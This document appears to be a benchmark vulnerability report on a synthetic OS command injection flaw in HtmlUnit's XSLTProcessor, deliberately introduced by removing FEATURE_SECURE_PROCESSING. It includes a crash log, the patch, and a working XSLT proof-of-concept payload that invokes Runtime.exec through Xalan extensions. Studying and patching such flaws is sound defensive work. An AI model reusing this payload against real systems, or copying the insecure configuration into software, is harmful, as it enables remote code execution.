# Vulnerability Analysis for cpv_0

## Summary
- **CPV ID**: cpv_0
- **Harness**: HtmlunitOneFDP
- **Vulnerability Type**: OS Command Injection via XSLT
- **Origin**: synthetic
- **Release Date**: 02/01/2026
- **References**: N/A (synthetic vulnerability)

## Crash Log Analysis
- **Error Type**: FuzzerSecurityIssueCritical: OS Command Injection
- **Crash Location**: org.htmlunit.javascript.host.xml.XSLTProcessor:262 (transform method)
- **Vulnerable Function**: `transform(final Node source)`
- **DEDUP Token**: 6c9c49988e32b0f0

### Stack Trace
```
== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: OS Command Injection
Executing OS commands with attacker-controlled data can lead to remote code execution.
	at com.code_intelligence.jazzer.sanitizers.OsCommandInjection.processImplStartHook(OsCommandInjection.kt:60)
	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1110)
	at java.base/java.lang.ProcessBuilder.start(ProcessBuilder.java:1073)
	at java.base/java.lang.Runtime.exec(Runtime.java:594)
	at java.base/java.lang.Runtime.exec(Runtime.java:418)
	at java.base/java.lang.Runtime.exec(Runtime.java:315)
	at jdk.translet/die.verwandlung.GregorSamsa.template$dot$0()
	at jdk.translet/die.verwandlung.GregorSamsa.applyTemplates()
	at jdk.translet/die.verwandlung.GregorSamsa.transform()
	at java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.transform(AbstractTranslet.java:627)
	at java.xml/com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:784)
	at java.xml/com.sun.org.apache.xalan.internal.xsltc.trax.TransformerImpl.transform(TransformerImpl.java:397)
	at org.htmlunit.javascript.host.xml.XSLTProcessor.transform(XSLTProcessor.java:262)
	at org.htmlunit.javascript.host.xml.XSLTProcessor.transformToFragment(XSLTProcessor.java:311)
```

## Vulnerable Code Location(s)

### Location 1 (crash_site)
- **Type**: crash_site
- **File Path**: src/main/java/org/htmlunit/javascript/host/xml/XSLTProcessor.java
- **Function**: transform
- **Line Range**: 262-262
- **Column Range**: 1-100

### Location 2 (root_cause)
- **Type**: root_cause
- **File Path**: src/main/java/org/htmlunit/javascript/host/xml/XSLTProcessor.java
- **Function**: configureTransformerFactory
- **Line Range**: 129-138
- **Column Range**: 1-80

### Code Context

**Root Cause Location (Missing Security Configuration):**
```java
private void configureTransformerFactory(TransformerFactory factory)
    throws TransformerConfigurationException {
    // MISSING: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    
    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "file");
    factory.setURIResolver(new AllowlistURIResolver());

    factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
}
```

**Crash Site (Transform Invocation):**
```java
final Transformer transformer = transformerFactory.newTransformer(xsltSource);
transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");

for (final Map.Entry<String, Object> entry : parameters_.entrySet()) {
    transformer.setParameter(entry.getKey(), entry.getValue());
}

final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
final org.w3c.dom.Document containerDocument = factory.newDocumentBuilder().newDocument();
final org.w3c.dom.Element containerElement = containerDocument.createElement("container");
containerDocument.appendChild(containerElement);

final DOMResult result = new DOMResult(containerElement);
transformer.transform(xmlSource, result); // Line 262 - crash site
```

## CWE Classification
- **CWE-94**: Improper Control of Generation of Code ('Code Injection')
- **CWE-91**: XML Injection (Aka Blind XPath Injection)
- **CWE-611**: Improper Restriction of XML External Entity Reference

## Vulnerability Description

This is an **OS Command Injection vulnerability via XSLT** in HtmlUnit's XSLTProcessor implementation. The vulnerability occurs because the `FEATURE_SECURE_PROCESSING` security feature is not enabled when creating the XSLT TransformerFactory.

**Root Cause:**
The `configureTransformerFactory()` method fails to enable secure processing (`XMLConstants.FEATURE_SECURE_PROCESSING`). This allows malicious XSLT stylesheets to leverage Xalan's Java extension functions to invoke arbitrary Java methods, including `Runtime.exec()`.

**Attack Vector:**
An attacker can craft a malicious HTML page containing an XSLT stylesheet that:
1. Uses Xalan extension namespaces (e.g., `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"`)
2. Invokes `Runtime.getRuntime()` and `Runtime.exec()` methods
3. Executes arbitrary OS commands when the XSLT transformation is processed

**Impact:**
- Remote Code Execution (RCE)
- Complete system compromise
- Data exfiltration
- Lateral movement in enterprise environments

## POV Analysis

The proof-of-vulnerability (`pov_0.blob`) is an HTML file that demonstrates the vulnerability:

```html
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" 
    xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
   <xsl:template match="/">
     <xsl:variable name="rtobject" select="rt:getRuntime()"/>
     <xsl:variable name="process" select="rt:exec($rtobject,'jazze')"/>
     <xsl:variable name="processString" select="ob:toString($process)"/>
     <span><xsl:value-of select="$processString"/></span>
   </xsl:template>
</xsl:stylesheet>
```

The POV:
1. Creates an XSLTProcessor instance
2. Imports a malicious XSLT stylesheet with Xalan Java extensions
3. Triggers transformation via `transformToFragment()`
4. The malicious stylesheet invokes `Runtime.exec('jazze')` to execute an OS command
5. Jazzer's OS Command Injection sanitizer detects the vulnerability

## Patch Analysis

The patch adds the missing security configuration to prevent XSLT code injection:

```diff
private void configureTransformerFactory(TransformerFactory factory)
    throws TransformerConfigurationException {
+        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+
        factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "file");
        factory.setURIResolver(new AllowlistURIResolver());
```

**Fix Mechanism:**
- Enables `FEATURE_SECURE_PROCESSING` which restricts the use of potentially dangerous XSLT features
- Prevents access to Java extension functions in XSLT stylesheets
- Blocks arbitrary code execution through Xalan extensions

**Note on Origin:**
This is a **synthetic vulnerability** created for the benchmark. While HtmlUnit had a similar real-world vulnerability (CVE-2023-49093) in a different class (`org.htmlunit.activex.javascript.msxml.XSLProcessor`), this specific instance in `org.htmlunit.javascript.host.xml.XSLTProcessor` was intentionally introduced by removing the `FEATURE_SECURE_PROCESSING` line that existed in commit a6c032ca and was removed in commit f8ca935 (Oct 20, 2024). The patch restores the security configuration.

## Recommendations
- **Suggested CWEs**: [CWE-94, CWE-91, CWE-611]
- **Vulnerability Name**: "Missing FEATURE_SECURE_PROCESSING in XSLTProcessor allows XSLT-based RCE"
- **Severity**: Critical (CVSS 9.8) - Network-accessible, no authentication required, complete system compromise
- **Mitigation**: Always enable `FEATURE_SECURE_PROCESSING` for all XSLT transformers to prevent code injection attacks